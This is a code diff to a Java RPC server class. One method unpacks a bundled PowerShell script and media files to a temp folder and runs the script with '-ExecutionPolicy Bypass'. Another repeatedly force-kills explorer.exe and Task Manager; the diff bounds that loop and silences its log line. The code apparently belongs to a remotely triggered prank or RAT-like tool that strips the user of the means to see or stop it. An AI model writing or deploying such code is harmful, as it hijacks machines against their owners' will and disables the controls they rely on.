@@ -28,42 +28,55 @@ public class RpcServerMethods {
         }
     }
 
-    public void runScriptFromResources(String resourceName) {
+    public void runScriptWithResources(String scriptName, String... resourceNames) {
         try {
-            // Load the script from resources (classpath)
-            InputStream in = getClass().getClassLoader().getResourceAsStream(resourceName);
-            if (in == null) {
-                throw new FileNotFoundException("Resource not found: " + resourceName);
-            }
-            // Write the script to a temp file
-            File tempFile = File.createTempFile("script", ".ps1");
-            tempFile.deleteOnExit();
-            try (FileOutputStream out = new FileOutputStream(tempFile)) {
+            // Create a temporary directory for the script and resources
+            File tempDir = new File(System.getProperty("java.io.tmpdir"), "toast_" + System.nanoTime());
+            tempDir.mkdir();
+
+            // Extract the script to the temp directory
+            File ps1File = new File(tempDir, scriptName);
+            try (InputStream in = getClass().getClassLoader().getResourceAsStream(scriptName);
+                 FileOutputStream out = new FileOutputStream(ps1File)) {
+                if (in == null) throw new FileNotFoundException("Resource not found: " + scriptName);
                 byte[] buffer = new byte[1024];
                 int len;
-                while ((len = in.read(buffer)) > 0) {
-                    out.write(buffer, 0, len);
-                }
+                while ((len = in.read(buffer)) > 0) out.write(buffer, 0, len);
             }
-            in.close();
-            // Run the temp file with PowerShell
+            ps1File.deleteOnExit();
+
+            // Extract any additional resources (e.g. images, wav) to the same folder
+            for (String res : resourceNames) {
+                File resFile = new File(tempDir, res);
+                try (InputStream in = getClass().getClassLoader().getResourceAsStream(res);
+                     FileOutputStream out = new FileOutputStream(resFile)) {
+                    if (in == null) throw new FileNotFoundException("Resource not found: " + res);
+                    byte[] buffer = new byte[1024];
+                    int len;
+                    while ((len = in.read(buffer)) > 0) out.write(buffer, 0, len);
+                }
+                resFile.deleteOnExit();
+            }
+
+            // Run the PowerShell script with the temp directory as working directory
             ProcessBuilder pb = new ProcessBuilder(
-                    "powershell.exe", "-ExecutionPolicy", "Bypass", "-File", tempFile.getAbsolutePath());
+                    "powershell.exe", "-ExecutionPolicy", "Bypass", "-File", ps1File.getAbsolutePath());
+            pb.directory(tempDir); // so relative paths work!
             pb.redirectErrorStream(true);
             Process process = pb.start();
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
-            while ((line = reader.readLine()) != null) {
-                System.out.println(line);
-            }
+            while ((line = reader.readLine()) != null) System.out.println(line);
             int exitCode = process.waitFor();
             System.out.println("PowerShell script exited with code: " + exitCode);
+
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     public void runKillTaskmngrAndExp() {
+        int loopsDone = 0;
         while(true) {
             try {
                 // Kill explorer.exe
@@ -74,7 +87,14 @@ public class RpcServerMethods {
                 Process taskmgr = Runtime.getRuntime().exec("taskkill /F /IM Taskmgr.exe");
                 taskmgr.waitFor();
 
-                System.out.println("explorer.exe and Taskmgr.exe killed!");
+//                System.out.println("explorer.exe and Taskmgr.exe killed!");
+                if(loopsDone > 20) {
+                    break;
+                }
+                else {
+                    loopsDone++;
+                    Thread.sleep(500);
+                }
             } catch (Exception e) {
                 e.printStackTrace();
             }
